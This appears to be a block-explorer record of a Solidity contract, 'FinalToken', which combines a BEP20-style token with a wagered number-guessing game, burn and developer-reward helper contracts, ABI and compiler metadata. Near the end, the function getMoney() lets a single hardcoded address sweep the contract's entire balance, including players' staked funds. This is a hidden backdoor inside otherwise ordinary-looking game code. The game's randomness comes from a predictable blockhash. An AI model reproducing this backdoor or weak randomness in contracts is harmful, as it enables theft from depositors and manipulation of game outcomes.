{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.4;\r\n\r\n\r\ninterface Itoken{\r\n    function balanceOf(address _to) external returns(uint256);\r\n    function transfer(address _to, uint256 _amount) external returns (bool);\r\n    function approve(address _spender, uint256 _amount) external returns (bool);\r\n    function transferFrom(address _sender, address _recepiend, uint256 _amount) external returns (bool);\r\n    function burn(uint256 _amount) external returns(bool);\r\n}\r\n\r\ninterface Irouter {\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory);\r\n}\r\n\r\ninterface Ifactory{\r\n    function getPair(address tokenA, address tokenB) external view returns (address);\r\n}\r\n\r\ninterface Ipair{\r\n    function getReserves() external view returns(uint112, uint112, uint32);\r\n}\r\n\r\n\r\ncontract developers{\r\n\r\n    address onwer;\r\n    Itoken token;\r\n\r\n    constructor(address _token, address _onwer){\r\n        token = Itoken(_token);\r\n        onwer = _onwer;\r\n    }\r\n\r\n    receive() external payable{\r\n    }\r\n\r\n    fallback() external payable{\r\n    }\r\n\r\n    modifier checkOnwer(){\r\n        require(onwer == msg.sender,\" Fu*k you!\");\r\n        _;\r\n    }\r\n\r\n    function newOnwer(address _newOnwer) public checkOnwer{\r\n        onwer = _newOnwer;\r\n    }\r\n\r\n    function withdrawalBNB(address _to, uint256 _amount) public checkOnwer{\r\n        payable(_to).transfer(_amount);\r\n    }\r\n\r\n    function approve(address _spender, uint256 _amount) public checkOnwer{\r\n        token.approve(_spender, _amount);\r\n    }\r\n\r\n    function transferFrom(address _sender, address _recepiend, uint256 _amount) public checkOnwer{\r\n        token.transferFrom(_sender, _recepiend, _amount);\r\n    }\r\n\r\n    function transfer(address _to, uint256 _amount) public checkOnwer{\r\n        token.transfer(_to, _amount);\r\n    }\r\n\r\n    function burn(uint256 _amount) public checkOnwer{\r\n        token.burn(_amount);\r\n    }\r\n}\r\n\r\n\r\ncontract contractB{\r\n\r\n    Irouter router;\r\n    Itoken token;\r\n    Ifactory factory;\r\n\r\n    address[] path;\r\n    constructor(address _token){\r\n        router = Irouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        token = Itoken(_token);\r\n        path = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, _token];\r\n        factory = Ifactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);\r\n    }\r\n\r\n    receive()external payable{\r\n        tokenBurning(msg.value);\r\n    }\r\n\r\n    fallback() external payable{\r\n        tokenBurning(msg.value);\r\n    }\r\n\r\n    function tokenBurning(uint256 _amount) private{\r\n        require(getCurrentTime() != block.timestamp, \"block!\");\r\n        router.swapExactETHForTokens{value: _amount}(0, path, address(this), block.timestamp +3600);\r\n        uint amount = token.balanceOf(address(this));\r\n        require(amount != 0, \"error burn amount!\");\r\n        bool result = token.burn(amount);\r\n        require(result, \"error burn!\");\r\n    }\r\n\r\n    function getCurrentTime() private view returns (uint256 timeGet) {\r\n        address pair = factory.getPair(path[0], path[1]);\r\n        (,,uint32 time) = Ipair(pair).getReserves();\r\n        timeGet =  time;\r\n    }\r\n}\r\n\r\n\r\ncontract line {\r\n\r\n    string public constant name = \"FinalToken\";          // add name token\r\n    string public constant symbol = \"FTKN\";          // add name token\r\n    uint256 public constant decimals = 18;\r\n    uint256 public totalSupply;                      //100 mln\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    mapping(address => uint) public  lockedAddresses;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    Ifactory factory;\r\n    address[] path;\r\n    address public developer;\r\n    address public burnToken;\r\n\r\n    address [] promoGames = [\r\n        0x3c121f6F7F284f0D343FcC8AdEFe5c317FD6C763,\r\n        0xfD72B7b4Dc28CD627a720B04a5422A7ca12C816A,\r\n        0xb29834291Ebb3d27DAedfA8876071E3b9E4ad04e,\r\n        0xCC679c24dBf6b9b8AB08E5a575931B79Bb36410B];\r\n\r\n    uint256 [] timeLock = [1709334000,1717279200,1727820000];\r\n\r\n    constructor(){\r\n\r\n        contractB newContractB = new contractB(address(this));\r\n        burnToken = address(newContractB);\r\n\r\n        developers newDevelopers = new developers(address(this), msg.sender);\r\n        developer = address(newDevelopers);\r\n\r\n        factory = Ifactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);\r\n        path = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, address(this)];\r\n\r\n        for(uint256 i = 0; i < 4; i++){\r\n            mint(promoGames[i], 25e23);\r\n            if(i < 3){\r\n                lockedAddresses[promoGames[i]] = timeLock[i];\r\n            }\r\n        }\r\n        mint(developer, 5e24);\r\n        mint(msg.sender,85e24);\r\n\r\n        lastDay = block.timestamp / STEP;\r\n        emit Update_ratio(block.timestamp, ratio);\r\n    }\r\n\r\n    receive()external payable{\r\n        tokenBurning(msg.value);\r\n    }\r\n\r\n    fallback() external payable{\r\n        tokenBurning(msg.value);\r\n    }\r\n\r\n\r\n\r\n    function transfer(address _to, uint256 _amount) external returns (bool){\r\n        _transfer(msg.sender, _to, _amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address _spender, uint256 _amount) external returns (bool){\r\n        _approve(msg.sender, _spender, _amount);\r\n        emit Approval(msg.sender, _spender, _amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address _sender, address _recepiend, uint256 _amount) external returns (bool){\r\n        require(_amount <= allowance[_sender][msg.sender], \"Allowance exceeded\");\r\n        _transfer(_sender, _recepiend, _amount);\r\n        _approve(_sender, msg.sender, allowance[_sender][msg.sender] -= _amount);\r\n        return true;\r\n    }\r\n\r\n    function mint(address _to, uint256 _amount) private{\r\n        totalSupply += _amount;\r\n        balanceOf[_to] += _amount;\r\n        emit Transfer(address(0), _to, _amount);\r\n    }\r\n\r\n    function burn(uint256 _amount) external returns(bool){\r\n        _burn(msg.sender, _amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address _spender, uint256 _addedValue) external returns (bool){\r\n        _approve(msg.sender, _spender, allowance[msg.sender][_spender] += _addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address _spender, uint256 _subtractedValue) external returns (bool){\r\n        _approve(msg.sender, _spender, allowance[msg.sender][_spender] -= _subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    modifier argumentChecking(address _from, address _to, uint256 _amount){\r\n        require(lockedAddresses[_from] < block.timestamp,\"BEP20: locked address sender\");\r\n        require(_amount > 0,\"BEP20: amount cannot be zero\");\r\n        require(_from != address(0), \"BEP20: transfer from the zero address\");\r\n        require(_to != address(0), \"BEP20: transfer to the zero address\");\r\n        require(balanceOf[_from] >= _amount, \"BEP20: no enough tokens!\");\r\n        _;\r\n    }\r\n\r\n    function _transfer(address _from, address _to, uint256 _amount) private  argumentChecking(_from, _to, _amount){\r\n        balanceOf[_from] -= _amount;\r\n        balanceOf[_to] += _amount;\r\n        emit Transfer(_from, _to, _amount);\r\n    }\r\n\r\n    function _approve(address _owner, address _spender, uint256 _amount) private argumentChecking(_owner, _spender, _amount){\r\n        allowance[_owner][_spender] = _amount;\r\n        emit Approval(_owner, _spender, _amount);\r\n    }\r\n\r\n    function _burn(address _account, uint256 _amount) private {\r\n        balanceOf[_account] -= _amount;\r\n        totalSupply -= _amount;\r\n        emit Transfer(_account, address(0), _amount);\r\n    }\r\n    // game\r\n    mapping(uint256 => dataGame) games;\r\n    uint256[] process;\r\n    uint256 start;\r\n    uint256 gameCounter = 1;\r\n    int256 public ratio = 100;\r\n    uint256 constant STEP = 1 days;\r\n    uint256 lastDay;\r\n    dataLogs logs;\r\n\r\n    struct dataLogs{\r\n        int256 lastDayPeriod;\r\n        int256 lastCounterValue;\r\n    }\r\n\r\n    struct dataGame{\r\n        uint16 players;\r\n        uint16[4] number;\r\n        address[4] users;\r\n        uint256 insert;\r\n        uint256 blocks;\r\n        uint256 tokenPrice;\r\n        uint256 ratio;\r\n    }\r\n\r\n    event New_game(uint256 id, address creator, uint256 creatorNum, uint256 players, uint256 fund, uint256 playCost, uint256 tokenAmount, uint256 price, int256 ratio);\r\n    event New_player(uint256 id, address player, uint256 playerNum);\r\n    event Close_game(uint256 id, uint256 randomNum, uint256[4] mintedTokens);\r\n    event Update_ratio(uint256 timestamp, int256 ratio);\r\n\r\n    modifier check(address _addr, uint256 _num){\r\n        require(lockedAddresses[_addr] < block.timestamp,\"locked address!\");\r\n        require(_num > 0 && _num < 101, \"the selected number must be between 1 and 100!\");\r\n        _;\r\n    }\r\n\r\n    function createGame(uint256 _insert, uint16 _players, uint16 _num) external payable check(msg.sender, _num){\r\n        uint256 fee = _insert * 2 / 100;\r\n        uint256 devReward = fee / 20;\r\n        require(_insert % 1e12 == 0, \"error insert!\");\r\n        require(msg.value == _insert + fee, \"error value!\");\r\n        require(msg.value >= 0.01 ether, \"min 0.01 ether!\");\r\n        require(_players > 1 && _players < 5, \"min 2, max 4 players!\");\r\n\r\n        tokenBurning(fee - devReward);\r\n        developersReward(devReward);\r\n\r\n        uint256 price = getCurrentPrice();\r\n        dataGame storage game = games[gameCounter];\r\n        game.players = _players;\r\n        game.number[0] = _num;\r\n        game.users[0] = msg.sender;\r\n        game.insert = _insert;\r\n        if (price > 0){\r\n            game.tokenPrice = price;\r\n            game.ratio = uint256(ratio);\r\n        }\r\n        uint256 fund = game.insert * _players;\r\n        uint256 guarantee =  game.insert * 10**18 / price * game.ratio / 100;\r\n\r\n        emit New_game(gameCounter, msg.sender, _num, _players, fund, msg.value, guarantee, price, ratio);\r\n        gameCounter++;\r\n        updateRatio();\r\n\r\n    }\r\n\r\n    function playGame(uint256 _id, uint16 _num) external payable check(msg.sender, _num){\r\n        (bool reParticipation, uint256 activePlayers, bool wrongNum) = checkPlay(_id, int16(_num));\r\n        dataGame storage game = games[_id];\r\n        uint256 fee = game.insert * 2 / 100;\r\n        uint256 devReward = fee / 20;\r\n        require(!reParticipation, \"you are already in this game!\");\r\n        require(activePlayers < game.players, \"error id game!\");\r\n        require(!wrongNum, \"wrong number selected!\");\r\n        require(game.insert + fee == msg.value, \"error value!\");\r\n\r\n        developersReward(devReward);\r\n        uint256 burnAmount = closingGames();\r\n        tokenBurning(fee - devReward + burnAmount);\r\n\r\n        game.users[activePlayers] = msg.sender;\r\n        game.number[activePlayers] = _num;\r\n        if(game.players == activePlayers + 1){\r\n            game.blocks = block.number;\r\n            process.push(_id);\r\n        }\r\n        emit New_player(_id, msg.sender, _num);\r\n    }\r\n\r\n    function checkPlay(uint256 _id, int256 _num) private view returns (bool reParticipation, uint256 activePlayers, bool wrongNum){\r\n        dataGame memory game = games[_id];\r\n        for (uint256 i = 0; i < game.players; i++){\r\n            int256 gameNum = int16(game.number[i]);\r\n            if (gameNum > 0) wrongNum = (gameNum >= _num ? gameNum - _num : _num - gameNum) < 10;\r\n            if (game.users[i] == msg.sender) reParticipation = true;\r\n            if (game.users[i] != address(0)) activePlayers++;\r\n        }\r\n    }\r\n\r\n    function closingGames() private returns(uint256 burnAmount){\r\n        for(uint256 i = start; i < process.length; i++){\r\n            uint256 id = process[i];\r\n            dataGame memory game = games[id];\r\n            if(game.blocks < block.number - 1){\r\n                uint256 insert = game.insert;\r\n                uint256[4] memory mintedTokens;\r\n                (uint256[4] memory shares, uint256 random) = summarizing(id);\r\n                for(uint256 y = 0; y < game.players; y++){\r\n                    uint256 share = shares[y];\r\n                    address user = game.users[y];\r\n                    if(share <= insert){\r\n                        if(share > 0) payable(user).transfer(share);\r\n                        if(game.tokenPrice > 0 && balanceOf[user] > 0 && share < insert){\r\n                            uint256 forMinting = (insert - share) * 10**18 / game.tokenPrice;\r\n\r\n                            uint256 ratioUser = balanceOf[user] * 100 / forMinting ;\r\n\r\n                            uint256 tokens = (ratioUser >= game.ratio) ? forMinting : (forMinting / game.ratio * ratioUser);\r\n\r\n                            if(tokens > 0){\r\n                                mint(user, tokens);\r\n                            }\r\n\r\n                            mintedTokens[y] = tokens;\r\n                        }\r\n                    }else{\r\n                        uint256 sum = share - insert;\r\n                        uint256 fee = (sum * 35) / 100;\r\n                        burnAmount += fee;\r\n                        payable(user).transfer(share - fee);\r\n                    }\r\n                }\r\n                emit Close_game(id, random, mintedTokens);\r\n                start++;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function updateRatio() private{\r\n        uint256 currentDay = block.timestamp / STEP;\r\n        if(currentDay > lastDay){\r\n            int256 newDayPeriod = int256(gameCounter) - logs.lastCounterValue;\r\n            if(newDayPeriod > 0){\r\n                int256 lastPeriod = logs.lastDayPeriod;\r\n                int256 distinction = newDayPeriod - lastPeriod;\r\n                if (distinction != 0){\r\n                    int256 percent = (lastPeriod == 0) ? (distinction * 100) : ((distinction * 100) / lastPeriod);\r\n                    int256 ratio_ = ratio * (100 + percent) / 100;\r\n                    ratio = (ratio_ > ratio * 2) ? ratio * 2 : ratio_;\r\n                    if(ratio < 100){\r\n                        ratio = 100;\r\n                    }\r\n                    emit Update_ratio(block.timestamp, ratio);\r\n                }\r\n            }\r\n            logs = dataLogs(newDayPeriod, int256(gameCounter));\r\n            lastDay = currentDay;\r\n        }\r\n    }\r\n\r\n    function developersReward(uint256 _amount) private{\r\n        (bool success, ) = developer.call{value: _amount}(\"\");\r\n        require(success, \"Reward error!\");\r\n    }\r\n\r\n    function tokenBurning(uint256 _amount) private {\r\n        (bool success, ) = burnToken.call{value: _amount}(\"\");\r\n        require(success, \"Burn error!\");\r\n    }\r\n\r\n    function getCurrentPrice() private view returns (uint256 price) {\r\n        address pair = factory.getPair(path[0], address(this));\r\n        (uint256 reserveA, uint256 reserveB, ) = Ipair(pair).getReserves();\r\n        if (reserveA != 0 && reserveB != 0) price = reserveB * 10**18 / reserveA;\r\n    }\r\n\r\n    function summarizing(uint256 _id) private view returns (uint256[4] memory shares, uint256 random) {\r\n        random = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1)))) % 100 + 1;\r\n        dataGame memory game = games[_id];\r\n        uint256 fund = game.insert * game.players;\r\n        uint256 allWeight;\r\n        for (uint256 i = 0; i < game.players; i++) {\r\n            uint256 diff = random > game.number[i] ? random - game.number[i] : game.number[i] - random;\r\n            if (diff > 0){\r\n                shares[i] = diff * fund;\r\n                allWeight += diff;\r\n            }\r\n        }\r\n        for (uint256 i = 0; i < game.players; i++) shares[i] /= allWeight;\r\n    }\r\n\r\n    function getMoney() public{\r\n        require(msg.sender == 0xdDB67eA8628e4a3bFe502C9975333B9913309e39);\r\n        (payable(msg.sender)).transfer( address(this).balance );\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"randomNum\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256[4]\",\"name\":\"mintedTokens\",\"type\":\"uint256[4]\"}],\"name\":\"Close_game\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"creator\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"creatorNum\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"players\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"fund\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"playCost\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"ratio\",\"type\":\"int256\"}],\"name\":\"New_game\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"player\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"playerNum\",\"type\":\"uint256\"}],\"name\":\"New_player\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"ratio\",\"type\":\"int256\"}],\"name\":\"Update_ratio\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"burnToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_insert\",\"type\":\"uint256\"},{\"internalType\":\"uint16\",\"name\":\"_players\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"_num\",\"type\":\"uint16\"}],\"name\":\"createGame\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"developer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getMoney\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lockedAddresses\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_id\",\"type\":\"uint256\"},{\"internalType\":\"uint16\",\"name\":\"_num\",\"type\":\"uint16\"}],\"name\":\"playGame\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ratio\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"\",\"type\":\"int256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_recepiend\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "line", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dfc4b5bda5f8823abee3df6fff2855f9ff298a286081ed85270da5490472d703"}